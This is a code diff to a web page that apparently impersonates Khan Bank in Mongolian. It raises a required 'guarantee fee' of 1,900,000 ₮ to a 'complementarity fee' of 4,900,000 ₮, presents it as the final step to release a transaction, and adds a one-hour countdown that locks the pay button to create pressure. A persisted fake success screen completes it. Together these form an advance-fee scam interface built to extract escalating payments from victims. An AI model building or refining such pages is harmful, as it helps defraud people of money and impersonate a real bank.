@@ -57,6 +57,11 @@
             50% { opacity: 1; transform: scale(1.02); }
         }
 
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         .bank-header {
             display: flex;
             align-items: center;
@@ -411,7 +416,50 @@
             color: #0a4028;
         }
 
-        /* ===== FRAIS DE GARANTIE ===== */
+        /* ===== TIMER ===== */
+        .timer-block {
+            background: #fcf8f0;
+            border-radius: 28px;
+            padding: 16px 28px;
+            margin: 18px 0 22px;
+            border: 2px solid #d4b87a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .timer-block .timer-icon {
+            font-size: 32px;
+            color: #b8860b;
+        }
+
+        .timer-block .timer-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #5a401a;
+        }
+
+        .timer-block .timer-text strong {
+            color: #b8860b;
+            font-size: 22px;
+        }
+
+        .timer-block .timer-countdown {
+            font-size: 28px;
+            font-weight: 800;
+            color: #b8860b;
+            background: #f7f0db;
+            padding: 6px 28px;
+            border-radius: 60px;
+            border: 1px solid #d4b87a;
+            font-family: 'Courier New', monospace;
+            min-width: 120px;
+            text-align: center;
+        }
+
+        /* ===== FRAIS DE COMPLÉMENTARITÉ ===== */
         .frais-block {
             background: #fcf8f0;
             border-radius: 28px;
@@ -675,6 +723,25 @@
             color: #0a4028;
         }
 
+        .success-mode .timer-block {
+            border-color: #8ab8a0;
+            background: #e6f5ed;
+        }
+
+        .success-mode .timer-block .timer-text {
+            color: #0a4028;
+        }
+
+        .success-mode .timer-block .timer-text strong {
+            color: #1a7a4a;
+        }
+
+        .success-mode .timer-block .timer-countdown {
+            color: #1a7a4a;
+            background: #d4ece0;
+            border-color: #8ab8a0;
+        }
+
         @media (max-width: 640px) {
             .card {
                 padding: 20px 16px;
@@ -743,6 +810,15 @@
             }
             .progress-percent {
                 align-self: flex-start;
+            }
+            .timer-block {
+                flex-direction: column;
+                gap: 10px;
+                text-align: center;
+            }
+            .timer-block .timer-countdown {
+                font-size: 22px;
+                min-width: 80px;
             }
         }
     </style>
@@ -865,17 +941,28 @@
             </div>
         </div>
 
-        <!-- ===== FRAIS DE GARANTIE ===== -->
+        <!-- ===== TIMER ===== -->
+        <div class="timer-block" id="timerBlock">
+            <div class="timer-icon">
+                <i class="fas fa-clock"></i>
+            </div>
+            <div class="timer-text">
+                Төлбөр хийх үлдэгдэл хугацаа: <strong id="timerLabel">1 цаг</strong>
+            </div>
+            <div class="timer-countdown" id="timerCountdown">01:00:00</div>
+        </div>
+
+        <!-- ===== FRAIS DE COMPLÉMENTARITÉ ===== -->
         <div class="frais-block" id="fraisBlock">
             <span class="label-frais">
-                <i class="fas fa-shield"></i> Баталгааны төлбөр · Frais de garantie
+                <i class="fas fa-handshake"></i> Нэмэлт төлбөр · Frais de complémentarité
             </span>
             <span class="montant-frais">
-                <i class="fas fa-coins"></i> 1,900,000.00 ₮
+                <i class="fas fa-coins"></i> 4,900,000.00 ₮
             </span>
             <div class="info-text">
                 <i class="fas fa-info-circle"></i>
-                Эцсийн алхам: Баталгааны төлбөрийг төлсний дараа гүйлгээ бүрэн дуусгавар болно.
+                Эцсийн алхам: Нэмэлт төлбөрийг төлсний дараа гүйлгээ бүрэн дуусгавар болно.
             </div>
         </div>
 
@@ -886,11 +973,11 @@
             </div>
             <div class="text">
                 <i class="fas fa-arrow-right"></i>
-                <strong>Баталгааны төлбөрөө төлнө үү</strong> гүйлгээгээ бүрэн дуусгахын тулд.
+                <strong>Нэмэлт төлбөрөө төлнө үү</strong> гүйлгээгээ бүрэн дуусгахын тулд.
                 Төлбөр хийсний дараа таны гүйлгээ бүрэн дуусгавар болно.
             </div>
             <button class="btn-payer" id="btnPayer">
-                <i class="fas fa-check-circle"></i> 1,900,000 ₮ төлөх
+                <i class="fas fa-check-circle"></i> 4,900,000 ₮ төлөх
             </button>
         </div>
 
@@ -917,7 +1004,7 @@
 
     <script>
         (function() {
-            // ===== DATE =====
+            // ===== DATE AUTOMATIQUE =====
             const now = new Date();
             const year = now.getFullYear();
             const month = String(now.getMonth() + 1).padStart(2, '0');
@@ -925,11 +1012,12 @@
             document.getElementById('currentDate').textContent = `${year}-${month}-${day}`;
 
             // ===== LOCALSTORAGE PERSISTANCE =====
-            const STORAGE_KEY = 'khan_bank_garantie';
+            const STORAGE_KEY = 'khan_bank_complementarite';
 
             let state = {
                 isPaid: false,
                 isComplete: false,
+                timerEnd: null,
                 startTime: Date.now()
             };
 
@@ -962,12 +1050,79 @@
             const fraisBlock = document.getElementById('fraisBlock');
             const paiementBlock = document.getElementById('paiementBlock');
             const btnPayer = document.getElementById('btnPayer');
+            const timerCountdown = document.getElementById('timerCountdown');
+            const timerLabel = document.getElementById('timerLabel');
+            const timerBlock = document.getElementById('timerBlock');
             const card = document.getElementById('app');
 
-            // ===== FONCTIONS =====
+            // ===== TIMER =====
+            let timerInterval = null;
+            const TIMER_DURATION = 3600; // 1 heure en secondes
+
+            function startTimer() {
+                let remaining;
+
+                if (state.timerEnd) {
+                    // Reprendre depuis la dernière sauvegarde
+                    remaining = Math.max(0, Math.floor((state.timerEnd - Date.now()) / 1000));
+                } else {
+                    // Premier lancement
+                    state.timerEnd = Date.now() + TIMER_DURATION * 1000;
+                    remaining = TIMER_DURATION;
+                    saveState();
+                }
+
+                if (remaining <= 0) {
+                    // Timer expiré
+                    timerCountdown.textContent = '00:00:00';
+                    timerLabel.textContent = 'Хугацаа дууссан';
+                    btnPayer.disabled = true;
+                    btnPayer.style.opacity = '0.5';
+                    btnPayer.textContent = 'Хугацаа дууссан';
+                    return;
+                }
+
+                updateTimerDisplay(remaining);
+
+                timerInterval = setInterval(() => {
+                    remaining = Math.max(0, Math.floor((state.timerEnd - Date.now()) / 1000));
+
+                    if (remaining <= 0) {
+                        clearInterval(timerInterval);
+                        timerCountdown.textContent = '00:00:00';
+                        timerLabel.textContent = 'Хугацаа дууссан';
+                        btnPayer.disabled = true;
+                        btnPayer.style.opacity = '0.5';
+                        btnPayer.textContent = 'Хугацаа дууссан';
+                        return;
+                    }
+
+                    updateTimerDisplay(remaining);
+                }, 1000);
+            }
+
+            function updateTimerDisplay(seconds) {
+                const hours = Math.floor(seconds / 3600);
+                const minutes = Math.floor((seconds % 3600) / 60);
+                const secs = seconds % 60;
+
+                timerCountdown.textContent =
+                    `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+
+                if (hours > 0) {
+                    timerLabel.textContent = `${hours} цаг ${minutes} минут`;
+                } else if (minutes > 0) {
+                    timerLabel.textContent = `${minutes} минут`;
+                } else {
+                    timerLabel.textContent = `${secs} секунд`;
+                }
+            }
+
+            // ===== SUCCESS =====
             function showSuccess() {
                 state.isPaid = true;
                 state.isComplete = true;
+                if (timerInterval) clearInterval(timerInterval);
                 saveState();
 
                 card.classList.add('success-mode');
@@ -994,12 +1149,22 @@
                     </div>
                 `;
 
+                // Timer
+                timerBlock.querySelector('.timer-text').innerHTML = `
+                    <i class="fas fa-check-circle" style="color: #1a7a4a;"></i>
+                    <strong style="color: #1a7a4a;">Төлбөр амжилттай хийгдлээ!</strong>
+                `;
+                timerCountdown.textContent = '✅';
+                timerCountdown.style.background = '#d4ece0';
+                timerCountdown.style.borderColor = '#8ab8a0';
+                timerCountdown.style.color = '#1a7a4a';
+
                 // Frais block
                 fraisBlock.querySelector('.label-frais').innerHTML = `
                     <i class="fas fa-check-circle" style="color: #1a7a4a;"></i> Төлбөр амжилттай хийгдлээ
                 `;
                 fraisBlock.querySelector('.montant-frais').innerHTML = `
-                    <i class="fas fa-check-circle" style="color: #1a7a4a;"></i> 1,900,000.00 ₮
+                    <i class="fas fa-check-circle" style="color: #1a7a4a;"></i> 4,900,000.00 ₮
                 `;
                 fraisBlock.querySelector('.info-text').innerHTML = `
                     <i class="fas fa-check-circle" style="color: #1a7a4a;"></i>
@@ -1034,4 +1199,13 @@
                 }, 2000);
             });
 
-            // =====
+            // ===== INIT =====
+            if (hasSaved && (state.isPaid || state.isComplete)) {
+                showSuccess();
+            } else {
+                startTimer();
+            }
+        })();
+    </script>
+</body>
+</html>
